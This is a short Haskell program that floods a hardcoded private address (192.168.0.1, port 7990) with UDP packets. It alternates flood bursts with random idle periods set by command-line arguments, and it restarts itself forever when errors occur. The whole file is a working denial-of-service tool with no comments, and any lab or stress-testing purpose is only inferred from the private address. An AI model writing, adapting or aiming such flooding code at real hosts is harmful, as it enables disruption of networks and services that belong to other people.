module Main where

import Control.Concurrent
import Control.Exception (catch, finally)
import Control.Monad (forever)
import Data.ByteString.Char8 (pack)
import Network.Socket hiding (sendTo)
import Network.Socket.ByteString
import Prelude hiding (catch)
import System.Environment (getArgs)
import System.Random (randomRs, getStdGen)
import System.Timeout (timeout)

main :: IO ()
main = withSocketsDo $ do
    (mina:maxa:mini:maxi:_) <- fmap (fmap read) getArgs
    sig <- newEmptyMVar
    seed <- getStdGen
    let attackTime = randomRs (mina, maxa) seed :: [Int]
    let idleTime   = randomRs (mini, maxi) seed :: [Int]
    _ <- forkIO $ runForever (flood' attackTime idleTime sig) (10 * 1000000)
    takeMVar sig >> return ()
  where
    flood' attackTime idleTime sig =
        flood "192.168.0.1" 7990 attackTime idleTime sig

flood :: String -> Int -> [Int] -> [Int] -> MVar () -> IO ()
flood ip port attackTime idleTime sig = do
    addrinfo <- getAddrInfo Nothing (Just ip) (Just $ show port)
    let target = addrAddress (head addrinfo)
    sock <- socket AF_INET Datagram defaultProtocol
    (floodLoop sock target attackTime idleTime sig)
      `finally` sClose sock

floodLoop:: Socket -> SockAddr -> [Int] -> [Int] -> MVar () -> IO ()
floodLoop _ _ [] _ sig   = putMVar sig ()
floodLoop _ _ _ [] sig = putMVar sig ()
floodLoop sock target (a:as) (i:is) sig = do
    print $ "flood " ++ show a
    _ <- timeout (a * 1000000) $ forever $ sendTo sock attackString target
    print $ "sleep " ++ show i
    threadDelay (i * 1000000)
    floodLoop sock target as is sig
  where
    attackString = pack $ concat $ replicate 10 "Fl"

runForever :: IO () -> Int -> IO ()
runForever act time = do
    act `catch` (\err -> do
        print (err::IOError)
        threadDelay time
        runForever act time)
